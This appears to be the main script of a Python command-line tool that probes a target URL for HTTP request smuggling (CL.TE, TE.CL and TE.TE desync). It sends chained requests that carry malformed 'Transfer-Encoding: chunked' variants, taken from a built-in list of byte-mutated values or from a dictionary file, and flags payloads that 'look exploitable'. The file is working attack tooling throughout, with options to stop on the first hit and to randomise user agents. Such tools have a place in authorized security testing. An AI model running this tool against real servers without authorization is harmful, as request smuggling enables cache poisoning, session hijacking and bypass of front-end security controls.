#!/bin/python3

import os
import sys
import time
import debug
import socket
import random
import secrets
import argparse
from request import Request, MODES_CLTE, MODES_TECL, MODES_TETE
from user_agents import AGENTS
import requests

CRLFs = {
    "rn": b"\r\n",
    "n":  b"\n",
}

MODES = {
    "clte": MODES_CLTE,
    "tecl": MODES_TECL,
    "tete": MODES_TETE,
}

enum_field = ["one", "two", "three", "four", "five"]

SAMPLES = [
    b"chunked",
    b"chuncked",
    b"\x00chunked",
    b"\x0achunked",
    b"\x0dchunked",
    b"\x09chunked",
    b"\x0bchunked",
    b"chunked\x00",
    b"chunked\x0a",
    b"chunked\x0d",
    b"chunked\x09",
    b"chunked\x0b",
    b"chunked123",
    b" chunked",
    b"chunked ",
    b" chunked ",
    b"chunked;",
]

MAX_REQUESTS = 5

class MyParser( argparse.ArgumentParser ):
    def error( self, message ):
        sys.stderr.write( f'error: {message}\n' )
        self.print_help()
        sys.exit( 2 )

def do( args, payload ):
    request_object = None
    # try loading --request file
    if args.request is not None:
        try:
            fp = open( args.request, "rb" )
            request_object = Request.from_buffer(args.url, args.crlf, args.mode, fp.read())
            fp.close()
        except Exception as e:
            debug.error( e )
    # parse request from arguments
    else:
        request_object = Request( args.url, args.crlf, args.mode, args.connect_timeout if args.connect_timeout is not None else 10 )
    if args.mode == MODES_CLTE and args.two != "-1":
        isIn = False
        for k in args.header2:
            if "Content-Length:".lower() in k.lower():
                isIn = True
                break
        if not isIn:
            args.header2.append( "Content-Length: 100" )
            print("="*50)
    for i in range(1, MAX_REQUESTS+1 ):
        args_val = getattr( args, enum_field[i-1] )
        if args_val != "-1":
            request_object.append_request( args_val, getattr( args, f"header{i}" ), getattr( args, f"method{i}" ), i )
    if args.random_agent:
        request_object.agent = random.choice(AGENTS)
    request_object.end()
    if args.align is not None and args.mode == MODES_TECL:
        request_object.align( args.align )
    debug.show_verbose( "Base request:", 1 )
    result = request_object.start( payload )
    if args.align is not None and args.mode == MODES_CLTE:
        url = args.url + args.align
        if args.align[0] == "/" and args.url[0] == "/":
            url = args.url + args.align[1:]
        r = requests.get(url)
        result.append((len(r.text), r.text))
    debug.show_verbose( request_object.show(), 1 )
    if( len(result) > 1 ):
        meet = False
        for res in result:
            if args.filter is not None and args.filter in res[1]:
                meet = True
                debug.show(res[1])
            else:
                debug.show_verbose(res[1], 3)
                debug.show_verbose("="*50, 3)
            if not meet and args.filter is None:
                meet = True
        debug.show(f"{len(result)} requests returned.")
        debug.show(f"Payload: {payload} looks exploitable.\n")
        if args.mode == MODES_CLTE:
            debug.show("If you don't see the second response, should try this payload with different Content-Length.")
        if meet and args.stop:
            exit(0)
    else:
        debug.show_verbose(result[0][1], 3)
        debug.show(f"Probably {payload} is not exploitable.")

def attack( args ):
    if args.dictionary is not None:
        with open(args.dictionary, "r") as fp:
            payload = fp.readline()[:-1]
            while payload:
                fim = b""
                i = 0
                while i < len(payload):
                    if payload[i] == '\\' and payload[i+1] == 'x' and i+3 < len(payload):
                        fim += bytes([int(payload[i+2] + payload[i+3], 16)])
                        i+=4
                    else:
                        fim += bytes([ord(payload[i])])
                        i+=1
                do( args, fim )
                payload = fp.readline()[:-1]
    else:
        for payload in SAMPLES:
            do( args, payload )

def main():
    parser = MyParser()
    parser.add_argument( "url", help="target" )
    parser.add_argument( "--crlf", default="rn", type=str, help="CRLF to be used (default rn) [options rn and n]" )
    parser.add_argument( "--request", help="raw request file" )
    parser.add_argument( "--random-agent", default=False, action="store_true", help="use random user-agent" )
    parser.add_argument( "--one", default="/", help="first request specifier" )
    parser.add_argument( "--two", default="-1", help="second request specifier" )
    parser.add_argument( "--three", default="-1", help="third request specifier" )
    parser.add_argument( "--four", default="-1", help="fourth request specifier" )
    parser.add_argument( "--five", default="-1", help="fifth request specifier" )
    parser.add_argument( "-a", "--align", default=None, help="send a alignment request after the payload" )
    parser.add_argument( "-k", "--insecure", default=False, action="store_true", help="ignore ssl" )
    parser.add_argument( "-v", "--verbose", type=int, default=0, help="verbose mode (default: 0)" )
    parser.add_argument( "-o", "--output", help="output file (every request outputs according to verbose)" )
    parser.add_argument( "-m", "--mode", default="clte", choices=["clte", "tete", "tecl"], help="mode of operation" )
    parser.add_argument( "-t", "--connect-timeout", default=10, help="set timeout (default 10)" )
    parser.add_argument( "-f", "--filter", default=None, help="show payloads that contains this filter" )
    parser.add_argument( "-s", "--stop", default=False, action="store_true", help="stop on first possible find" )
    parser.add_argument( "-bs", "--binary-search", default=False, action="store_true", help="try to use binary search on content-length, when on clte mode (second request only)." )
    for i in range(1, MAX_REQUESTS+1):
        parser.add_argument( "-H%d"%i, "--header%d"%i, action="append", help="custom request %d headers"%i )
        parser.add_argument( "-X%d"%i, "--method%d"%i, default="POST", help="method for request %d (default: POST)"%i )
    parser.add_argument( "dictionary", nargs="?", help="custom payloads, to use bytes, prefix with \\x" )
    args = parser.parse_args()

    args.url = args.url.strip().lower()
    # True parse of CRLF option
    if args.crlf in CRLFs:
        args.crlf = CRLFs[args.crlf]
    else:
        args.crlf = b"\r\n"
    args.mode = MODES[args.mode]

    debug.set_level( args.verbose )

    args.connect_timeout = int(args.connect_timeout)

    # File handler for output
    output_file = None
    if args.output is not None:
        try:
            debug.set_out_file(open( args.output, "w" ))
        except PermissionError:
            debug.error( f"please check if you have write permissions to the output file." )

    attack( args )

    if output_file is not None:
        output_file.close()
    

if __name__ == "__main__":
    main()
